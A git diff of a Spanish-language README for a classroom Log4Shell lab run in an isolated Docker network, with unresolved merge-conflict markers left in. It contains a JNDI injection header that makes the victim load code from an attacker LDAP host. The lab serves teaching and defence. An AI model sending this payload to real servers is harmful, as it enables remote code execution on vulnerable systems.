@@ -29,6 +29,16 @@ Todo ocurre **dentro de la red `lab`** de Docker. La red es `internal: true`: lo
 contenedores no pueden alcanzar internet, así que no hay forma de que el payload
 se comunique hacia afuera. El impacto se evidencia con un archivo en la víctima.
 
+<<<<<<< HEAD
+## Requisitos
+
+- Docker + Docker Compose. Nada más (todo se construye en contenedores).
+
+## Reproducir (3 pasos)
+
+```bash
+cd demos/sesion-4/log4shell
+=======
 ## Requisitos (Ubuntu / Debian)
 
 Solo Docker. Instálalo una vez y añade tu usuario al grupo `docker`:
@@ -60,6 +70,7 @@ make demo LAB=01-log4shell     # build + exploit + evidencia + contención + dow
 
 ```bash
 cd ~/desarrollo-seguro-ucp/seclab/labs/01-log4shell
+>>>>>>> main
 
 # 1) Construir y levantar víctima + atacante (LDAP + HTTP)
 docker compose up -d --build
@@ -74,12 +85,15 @@ docker compose run --rm trigger -s \
 docker compose exec victim cat /tmp/pwned.txt
 ```
 
+<<<<<<< HEAD
+=======
 > Scripts incluidos para la clase:
 > - `./exploit.sh` — disparo + evidencia + prueba de contención.
 > - `./comparar.sh` — benigna vs payload: **las dos dan HTTP 200**, solo una deja rastro.
 > - `FORENSE.md` — guía forense desde la shell (vector, causa raíz, timeline, IOCs).
 > - `./demo-log4shell.sh` — la lección defensiva: SBOM → cruce con CVEs → fix a 2.17.1.
 
+>>>>>>> main
 Salida esperada del paso 3:
 
 ```
@@ -141,8 +155,13 @@ Mismo flujo; Kali ya trae Docker:
 
 ```bash
 # dentro de Kali, con Docker corriendo
+<<<<<<< HEAD
+git clone https://github.com/Jawy77/auditgate   # si aún no lo tienes el repo del curso
+cd desarrollo-seguro-ucp/demos/sesion-4/log4shell   # o copia esta carpeta
+=======
 git clone https://github.com/Hackwy402/desarrollo-seguro-ucp
 cd desarrollo-seguro-ucp/seclab/labs/01-log4shell
+>>>>>>> main
 docker compose up -d --build
 docker compose run --rm trigger -s -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' http://victim:8080/
 docker compose exec victim cat /tmp/pwned.txt
